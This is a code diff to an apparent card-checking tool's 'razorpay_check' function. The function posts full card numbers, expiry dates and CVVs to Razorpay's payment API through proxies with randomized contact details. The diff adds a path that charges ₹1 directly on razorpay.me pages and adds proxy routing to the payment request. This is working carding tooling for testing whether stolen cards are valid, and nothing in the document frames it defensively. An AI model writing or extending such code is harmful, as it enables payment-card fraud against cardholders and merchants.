@@ -305,17 +305,43 @@ async def razorpay_check(card: str, site: str, key: str, proxy_str=None):
         async with aiohttp.ClientSession(headers={'user-agent': UA},
                 connector=connector) as s:
 
+            # razorpay.me: skip order creation, charge directly with key + ₹1
             if _is_rzme(site):
-                order = await _create_rzme_order(site, key, proxy)
+                payload = {
+                    'amount':             '100',
+                    'currency':           'INR',
+                    'method':             'card',
+                    'card[name]':         f'{first} {last}',
+                    'card[number]':       cc,
+                    'card[expiry_month]': mm.zfill(2),
+                    'card[expiry_year]':  yy[-2:],
+                    'card[cvv]':          cvv,
+                    'key_id':             key,
+                    'contact':            _random_phone(),
+                    'email':              _random_email(),
+                    '_':                  str(int(time.time() * 1000)),
+                }
             else:
                 order = await _create_order(s, site, proxy)
-            if not order:
-                return {'status': 'Error', 'message': 'Order creation failed', 'card': card}
+                if not order:
+                    return {'status': 'Error', 'message': 'Order creation failed', 'card': card}
+                payload = {
+                    'amount':             str(order['amount']),
+                    'currency':           'INR',
+                    'order_id':           order['order_id'],
+                    'method':             'card',
+                    'card[name]':         f'{first} {last}',
+                    'card[number]':       cc,
+                    'card[expiry_month]': mm.zfill(2),
+                    'card[expiry_year]':  yy[-2:],
+                    'card[cvv]':          cvv,
+                    'key_id':             key,
+                    'contact':            _random_phone(),
+                    'email':              _random_email(),
+                    '_':                  str(int(time.time() * 1000)),
+                }
 
-            order_id = order['order_id']
-            amount   = order['amount']
-
-            # Razorpay payment
+            # Hit Razorpay payment API
             try:
                 async with aiohttp.ClientSession() as rz:
                     async with rz.post(
@@ -326,21 +352,8 @@ async def razorpay_check(card: str, site: str, key: str, proxy_str=None):
                             'user-agent':   UA,
                             'content-type': 'application/x-www-form-urlencoded',
                         },
-                        data={
-                            'amount':               str(amount),
-                            'currency':             'INR',
-                            'order_id':             order_id,
-                            'method':               'card',
-                            'card[name]':           f'{first} {last}',
-                            'card[number]':         cc,
-                            'card[expiry_month]':   mm.zfill(2),
-                            'card[expiry_year]':    yy[-2:],
-                            'card[cvv]':            cvv,
-                            'key_id':               key,
-                            'contact':              _random_phone(),
-                            'email':                _random_email(),
-                            '_':                    str(int(time.time() * 1000)),
-                        },
+                        data=payload,
+                        proxy=proxy,
                         timeout=aiohttp.ClientTimeout(total=30)
                     ) as dr:
                         d = await dr.json(content_type=None)
